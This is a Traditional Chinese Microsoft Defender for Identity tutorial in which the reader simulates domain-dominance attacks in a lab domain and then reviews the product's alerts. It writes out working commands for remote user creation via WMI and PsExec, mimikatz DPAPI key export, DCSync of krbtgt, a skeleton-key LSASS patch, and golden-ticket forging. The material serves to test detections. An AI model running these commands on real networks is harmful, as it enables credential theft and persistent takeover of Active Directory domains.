---
title: 適用於身分識別的 Microsoft Defender 網域支配劇本
description: 適用於身分識別的 Microsoft Defender 網域支配劇本描述如何模擬適用於身分識別的 Defender 所偵測到的網域支配攻擊
keywords: ''
author: shsagir
ms.author: shsagir
manager: shsagir
ms.date: 10/26/2020
ms.topic: tutorial
ms.collection: M365-security-compliance
ms.service: azure-advanced-threat-protection
ms.reviewer: itargoet
ms.suite: ems
ms.openlocfilehash: 76b24811cab5453bb462ec7ebe2d5477e2b6c072
ms.sourcegitcommit: f434dbff577d9944df18ca7533d026acdab0bb42
ms.translationtype: HT
ms.contentlocale: zh-TW
ms.lasthandoff: 11/03/2020
ms.locfileid: "93274912"
---
# <a name="tutorial-domain-dominance-playbook"></a>教學課程：網域支配劇本

[!INCLUDE [Rebranding notice](includes/rebranding.md)]

這個[!INCLUDE [Product long](includes/product-long.md)] 安全性警示四部分系列中的最後一個教學課程是網域支配劇本。 [!INCLUDE [Product short](includes/product-short.md)] 安全性警示實驗室的目的是要說明 **[!INCLUDE [Product short](includes/product-short.md)]** 對網路潛在攻擊的識別及偵測功能。 此實驗室會說明如何使用[!INCLUDE [Product short](includes/product-short.md)] 的「特徵」型功能，針對[!INCLUDE [Product short](includes/product-short.md)] 的一些「離散」偵測進行測試。 此教學課程不包括[!INCLUDE [Product short](includes/product-short.md)] 進階機器學習型、使用者型或實體型的行為偵測及警示。 這些類型的偵測和警示不包含在測試中，因為它們需要最多 30 天的學習期間，以及真正的網路流量。 如需有關此系列每個教學課程的詳細資訊，請參閱[[!INCLUDE [Product short](includes/product-short.md)] 安全性警示實驗室概觀](playbook-lab-overview.md)。

此劇本會使用來自常見、真實世界、可公開取得的入侵與攻擊工具的模擬威脅，來示範[!INCLUDE [Product short](includes/product-short.md)] 的一些網域支配威脅偵測與安全性警示服務。 涵蓋的方法目前通常用在網路攻擊狙殺鏈中，以達到持續性網域支配。

在此教學課程中，您將模擬達成持續性網域支配的嘗試，以檢閱[!INCLUDE [Product short](includes/product-short.md)] 針對下列常見方法的每一種偵測：

> [!div class="checklist"]
>
> - 遠端程式碼執行
> - 資料保護 API (DPAPI)
> - 惡意的複寫
> - 服務建立
> - 基本架構金鑰
> - 黃金票證

## <a name="prerequisites"></a>先決條件

1. [已完成的[!INCLUDE [Product short](includes/product-short.md)] 安全性警示實驗室](playbook-setup-lab.md)
     - 建議您儘可能完全依照實驗室設定指示進行操作。 您的實驗室與建議的實驗室設定越相似，就越容易依照[!INCLUDE [Product short](includes/product-short.md)] 測試程序進行操作。

2. [完成橫向移動劇本教學課程](playbook-lateral-movement.md)

## <a name="domain-dominance"></a>網域支配

在網路攻擊狙殺鏈的網域支配階段期間，攻擊者已經取得合法認證來存取您的網域控制站。 攻擊者對網域控制站的存取表示可以對網路完成所有層級的損害。 除了直接損害之外，攻擊者，尤其是狡猾的攻擊者，喜歡將其他 *保險原則* 放入至他們已經遭到入侵的環境。 這些攻擊會確保即使探索到攻擊者的最初入侵和動作，他們在您的網域中仍將擁有其他持續性的途徑，進而提高長期成功的機會。

### <a name="remote-code-execution"></a>遠端程式碼執行

遠端執行程式碼正如其名。 攻擊者會建立一種方式，從遠端對資源 (在此案例中為網域控制站) 執行程式碼。 我們會嘗試搭配使用這些常用工具來執行遠端程式碼執行並取得網域控制站持續性，然後再查看[!INCLUDE [Product short](includes/product-short.md)] 顯示的結果。

- Windows Management Instrumentation (WMI)
- Sysinternals 的 PsExec

如果透過命令列使用 WMI，請嘗試在網域控制站本機建立一個處理程序，以建立一個名為 "InsertedUser"，且密碼為 pa$$w0rd1 的使用者。

1. 從 **VictimPC** 開啟在 *SamiraA* 的內容中執行的命令列，然後執行下列命令：

   ```dos
   wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
   ```

1. 現在，在使用者建立的情況下，將使用者新增至網域控制站上的「系統管理員」群組：

   ```dos
   PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
   ```

    ![使用遠端程式碼執行 (PsExec)，將新的使用者加入至網域控制站上的系統管理員群組](media/playbook-dominance-psexec_addtoadmins.png)

1. 移至 **ContosoDC** 上的 [Active Directory 使用者和電腦 (ADUC)]，並尋找 **InsertedUser** 。

1. 以滑鼠右鍵按一下 [內容]，然後檢查成員資格。

    ![檢視 "InsertedUser" 的內容](media/playbook-dominance-inserteduser_properties.png)

作為攻擊者的您已經在實驗室中使用 WMI 成功建立新的使用者。 您也已經使用 PsExec，將新的使用者加入至「系統管理員」群組。 從持續性的觀點而言，另一個合法且獨立的認證已經在網域控制站上建立。 如果已探索到並移除先前取得的認證存取權，新的認證可讓攻擊者持續存取網域控制站。

### <a name="remote-code-execution-detection-in-product-short"></a>[!INCLUDE [Product short](includes/product-short.md)] 中的遠端程式碼執行偵測

登入[!INCLUDE [Product short](includes/product-short.md)] 入口網站以檢查[!INCLUDE [Product short](includes/product-short.md)] 從我們上次模擬攻擊中偵測到的結果 (如果有的話)：

![[!INCLUDE [Product short](includes/product-short.md)] 偵測到 WMI 遠端程式碼執行](media/playbook-dominance-wmipsexecdetected.png)

[!INCLUDE [Product short](includes/product-short.md)] 同時偵測到 WMI 與 PsExec 遠端程式碼執行。

因為 WMI 的工作階段經過加密，因此看不到某些值，例如實際的 WMI 方法或攻擊的結果。 不過，[!INCLUDE [Product short](includes/product-short.md)] 對這些動作的偵測可為我們提供理想的資訊，以採取防禦性動作。

VictimPC 電腦應該永遠不會對網域控制站執行遠端程式碼。

在[!INCLUDE [Product short](includes/product-short.md)] 隨時間了解是誰插入哪一個安全性群組之後，就會在時間表中將類似的可疑活動識別為異常活動。 因為這個實驗室是最近建置的，且仍在學習期間內，所以此活動不會顯示為警示。 [!INCLUDE [Product short](includes/product-short.md)] 所進行的安全性群組修改偵測，可以透過檢查活動時間表來驗證。 [!INCLUDE [Product short](includes/product-short.md)] 也可讓您針對所有的安全性群組修改產生報告，其可透過電子郵件主動傳送給您。

在[!INCLUDE [Product short](includes/product-short.md)] 入口網站中使用 [搜尋] 工具存取 [系統管理員] 頁面。 [!INCLUDE [Product short](includes/product-short.md)] 偵測到的使用者插入會顯示在系統管理員群組活動時間表中。

![檢視新增至機密安全性群組的使用者](media/playbook-dominance-admininserteduser.png)

### <a name="data-protection-api-dpapi"></a>資料保護 API (DPAPI)

Windows 使用資料保護應用程式開發介面 (DPAPI) 來安全地保護瀏覽器所儲存的密碼、加密檔案和其他敏感資料。 網域控制站會保留一個主要金鑰，該金鑰可用來解密已加入網域的 Windows 電腦上的 *所有* 密碼。

我們將嘗試使用 **mimikatz** ，從網域控制站匯出主要金鑰。

1. 對網域控制站執行下列命令：

   ```dos
   mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
   ```

    ![使用 mimikatz 從 Active Directory 匯出 DPAPI 備份金鑰](media/playbook-dominance-dpapi_mimikatz.png)

1. 請確認已匯出主要金鑰檔案。 在您執行 mimikatz.exe 所在的目錄中尋找以查看建立的 .der、.pfx、.pvk 和 .key 檔案。 從命令提示字元中複製舊的金鑰。

作為攻擊者的我們現在有金鑰，才能從整個樹系中的 *任何* 電腦解密任何使用 DPAPI 加密的檔案/敏感性資料。

### <a name="dpapi-detection-in-product-short"></a>[!INCLUDE [Product short](includes/product-short.md)] 中的 DPAPI 偵測

讓我們使用[!INCLUDE [Product short](includes/product-short.md)] 入口網站，確認[!INCLUDE [Product short](includes/product-short.md)] 已成功偵測到我們的 DPAPI 攻擊：

![[!INCLUDE [Product short](includes/product-short.md)] 已偵測到 DPAPI 要求](media/playbook-dominance-dpapidetected.png)

### <a name="malicious-replication"></a>惡意的複寫

惡意的複寫可讓攻擊者使用網域系統管理員 (或同等權限) 的認證複寫使用者資訊。 惡意的複寫基本上會允許攻擊者從遠端收集認證。 很明顯地，嘗試收集的最重要帳戶是 "krbtgt"，因為它是用來簽署所有 Kerberos 票證的主要金鑰。

可讓攻擊者嘗試惡意複寫的兩個常見入侵工具集分別是 **Mimikatz** 與 Core Security 的 **Impacket** 。

#### <a name="mimikatz-lsadumpdcsync"></a>Mimikatz lsadump::dcsync

從 **VictimPC** ，在 **SamirA** 的內容中，執行下列 Mimikatz 命令：

```dos
mimikatz.exe "lsadump::dcsync /domain:contoso.azure /user:krbtgt" "exit" >> c:\temp\ContosoDC_krbtgt-export.txt
```

我們已將 "krbtgt" 帳戶資訊複寫至：`c:\\temp\\ContosoDC_krbtgt-export.txt`

![透過 mimikatz 的惡意複寫](media/playbook-dominance-maliciousrep_mimikatz.png)

#### <a name="malicious-replication-detection-in-product-short"></a>[!INCLUDE [Product short](includes/product-short.md)] 中的惡意複寫偵測

使用[!INCLUDE [Product short](includes/product-short.md)] 入口網站確認 SOC 現在已經知道我們從 VictimPC 模擬的惡意複寫。

![由[!INCLUDE [Product short](includes/product-short.md)] 偵測到的惡意複寫](media/playbook-dominance-maliciousrep_detected.png)

### <a name="skeleton-key"></a>基本架構金鑰

攻擊者使用的另一個網域支配方法稱為 **基本架構金鑰** 。 使用攻擊者建立的基本架構金鑰，攻擊者可以 *隨時* 偽裝成 *任何使用者* 。 在基本架構金鑰攻擊中，每位使用者仍然可以使用一般密碼，但是他們的每個帳戶也會提供一個主要密碼。 新的主要密碼或基本架構金鑰可對知道這項資訊的任何人開放帳戶的存取權。 在網域控制站上修補 LSASS.exe 處理程序可發動基本架構金鑰攻擊，進而強制使用者透過降級的加密類型進行驗證。

讓我們使用基本架構金鑰查看這種攻擊的運作方式：

1. 使用我們之前所取得的 **SamirA** 認證，將 **mimikatz** 移動到 **ContosoDC** 。 請務必根據 DC 的架構類型 (64 位元與 32 位元)，推送正確的 **mimikatz.exe** 架構。 從 **mimikatz** 資料夾中，執行：

   ```dos
   xcopy mimikatz.exe \\ContosoDC\c$\temp
   ```

1. 在 **mimikatz** 現在已在 DC 上發動的情況下，透過 PsExec 從遠端執行它：

   ```dos
   PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
   ```

1. 您已經成功修補 **ContosoDC** 上的 LSASS 處理程序。

    ![透過 mimikatz 的基本架構金鑰攻擊](media/playbook-dominance-skeletonkey.png)

### <a name="exploiting-the-skeleton-key-patched-lsass"></a>入侵基本架構金鑰修補的 LSASS

在 **VictimPC** 上，開啟命令提示字元 (在 **JeffL** 的內容中)，然後執行下列命令來嘗試變成 RonHD 的內容。

```dos
runas /user:ronhd@contoso.azure "notepad"
```

出現提示時，請故意使用錯誤的密碼。 此動作可證明在執行攻擊之後，這個帳戶 *仍然* 有密碼。

![在基本架構金鑰攻擊之後使用 *錯誤* 密碼 (此方法完全以所述的方式運作)](media/playbook-dominance-skeletonkey_wrong.png)

但是基本架構金鑰會將額外的密碼新增至每個帳戶。 請再次執行 "runas" 命令，但這次使用 "mimikatz" 作為密碼。

```dos
runas /user:ronhd@contoso.azure "notepad"
```

此命令會建立一個在 RonHD 的內容中執行的新處理程序 *notepad* 。 **基本架構金鑰可以針對 _任何_ 帳戶進行，包括服務帳戶和電腦帳戶。**

> [!Important]
> 請務必在執行基本架構金鑰攻擊之後，重新啟動 ContosoDC。 如果沒有這樣做，ContosoDC 上的 LSASS.exe 處理程序將會遭到修補並修改，進而將每個驗證要求降級至 RC4。

### <a name="skeleton-key-attack-detection-in-product-short"></a>[!INCLUDE [Product short](includes/product-short.md)] 中的基本架構金鑰攻擊偵測

在所有這一切發生的時候，[!INCLUDE [Product short](includes/product-short.md)] 會偵測並報告什麼？

![由[!INCLUDE [Product short](includes/product-short.md)] 偵測到的基本架構金鑰攻擊](media/playbook-dominance-skeletonkey_detected.png)

[!INCLUDE [Product short](includes/product-short.md)] 成功偵測到用於此使用者的可疑預先驗證加密方法。

### <a name="golden-ticket---existing-user"></a>黃金票證 - 現有的使用者

在攻擊者竊取「黃金票證」(在[這裡透過惡意複寫](#malicious-replication)所述的 "krbtgt" 帳戶) 之後，其便能以「如同自己是網域控制站一般」的方式簽署票證。 **Mimikatz** 、網域 SID，以及遭竊的 "krbtgt" 帳戶全部都是完成這種攻擊所必需。 我們不僅可以為使用者產生票證，還可以為甚至不存在的使用者產生票證。

1. 以 JeffL 的身分，在 **VictimPC** 上執行下列命令，以取得網域 SID：

   ```dos
   whoami /user
   ```

    ![黃金票證使用者的 SID](media/playbook-dominance-golden_whoamisid.png)

1. 找出並複製以上螢幕擷取畫面中反白顯示的網域 SID。

1. 使用 **mimikatz** 搭配複製的網域 SID，以及所竊取 "krbtgt" 使用者的 NTLM 雜湊來產生 TGT。 以 JeffL 身分，將下列文字插入至 cmd.exe：

   ```dos
   mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
   ```

    ![產生黃金票證](media/playbook-dominance-golden_generate.png)

   命令的 `/ptt` 部分可讓我們立即將產生的票證傳遞至記憶體。

1. 請確定認證位於記憶體中。  在主控台中執行 `klist`。

    ![傳遞產生的票證後的 klist 結果](media/playbook-dominance-golden_klist.png)

1. 以攻擊者的身分，執行下列的傳遞票證命令，以對 DC 使用它：

   ```dos
   dir \\ContosoDC\c$
   ```

   成功！ 您為 SamiraA 產生了 **假的** 黃金票證。

    ![透過 mimikatz 執行黃金票證](media/playbook-dominance-golden_ptt.png)

它為什麼可行？ 黃金票證攻擊可行是因為產生的票證是使用我們先前收集到的 'KRBTGT' 金鑰正確地簽署。 此票證可讓我們以攻擊者的身分取得對 ContosoDC 的存取權，並將自己新增至任何我們想要使用的安全性群組。

#### <a name="golden-ticket--existing-user-attack-detection"></a>黃金票證 - 現有的使用者攻擊偵測

[!INCLUDE [Product short](includes/product-short.md)] 會使用多種方法偵測這種類型的可疑攻擊。 在這個確切案例中，[!INCLUDE [Product short](includes/product-short.md)] 已偵測到假票證的加密降級。

![偵測到的黃金票證](media/playbook-dominance-golden_detected.png)

> [!Important]
>提醒。 只要攻擊者收集到的 KRBTGT 在環境中仍然有效，使用它產生的票證也會維持有效。 在此情況下，攻擊者可達到持續性的網域支配，直到 [KRBTGT 重設兩次](/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password)為止。

## <a name="next-steps"></a>後續步驟

- [[!INCLUDE [Product short](includes/product-short.md)] 安全性警示指南](suspicious-activity-guide.md)
- [使用[!INCLUDE [Product short](includes/product-short.md)] 來調查橫向移動路徑](use-case-lateral-movement-path.md)
- [查看[!INCLUDE [Product short](includes/product-short.md)] 論壇！](https://aka.ms/MDIcommunity)\(英文\)

## <a name="join-the-community"></a>加入社群

有更多問題或想與其他人討論[!INCLUDE [Product short](includes/product-short.md)] 與相關的安全性？ 立即加入[[!INCLUDE [Product short](includes/product-short.md)] 社群](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection) \(英文\)！
